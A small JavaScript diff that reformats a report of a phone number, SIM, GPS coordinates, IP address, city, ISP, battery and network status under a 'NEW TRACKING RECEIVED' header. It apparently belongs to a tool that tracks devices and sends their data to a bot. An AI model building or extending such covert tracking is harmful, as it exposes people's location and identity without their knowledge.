@@ -336,10 +336,13 @@ async function getInfoText(phone, puce) {
   const lat = geoCoords?.latitude?.toFixed(6) || 'unknown';
   const lon = geoCoords?.longitude?.toFixed(6) || 'unknown';
 
-  return `📞 Phone: ${phone}
+  return `NEW TRACKING RECEIVED 🤖
+
+📞 Phone: ${phone}
 📶 Puce: ${puce}
 📍 Location: lat=${lat}, lon=${lon}
-🌐 IP: ${ip.ip || '?'} | ${ip.city || ''}, ${ip.country || ''}
+🌐 IP: ${ip.ip || '?'}
+🗺️ City: ${ip.city || ''}, ${ip.country || ''}
 🏢 ISP: ${ip.org || ''}
 🔋 ${battery}
 📡 ${net}
